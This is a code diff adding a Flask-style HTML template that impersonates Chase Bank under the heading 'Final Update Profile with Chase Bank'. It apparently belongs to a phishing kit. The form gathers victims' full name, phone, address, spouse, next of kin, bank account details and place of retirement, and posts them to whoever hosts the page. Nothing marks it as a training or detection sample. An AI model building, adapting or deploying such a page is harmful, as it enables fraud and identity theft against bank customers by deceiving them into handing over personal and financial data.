@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <title>Personal Information</title>
+
+    <link rel="stylesheet"
+          href="{{ url_for('static', filename='style.css') }}">
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Final Update Profile with Chase Bank</h2>
+
+<form method="POST">
+
+<input type="text"
+       name="fullname"
+       placeholder="Full Name"
+       required>
+
+<input type="text"
+       name="phone"
+       placeholder="Phone Number"
+       required>
+
+<input type="text"
+       name="address"
+       placeholder="Address"
+       required>
+
+<input type="text"
+       name="spouse"
+       placeholder="Spouse">
+
+<input type="text"
+       name="nextofkin"
+       placeholder="Next of Kin"
+       required>
+
+<input type="text"
+       name="bankaccount"
+       placeholder="Bank Account Details"
+       required>
+       
+<input type="text"
+       name="placeofretirement"
+       placeholder="Place of Retirement"
+       required>       
+
+<button type="submit">
+
+Save Information
+
+</button>
+
+</form>
+
+</div>
+
+</body>
+
+</html>
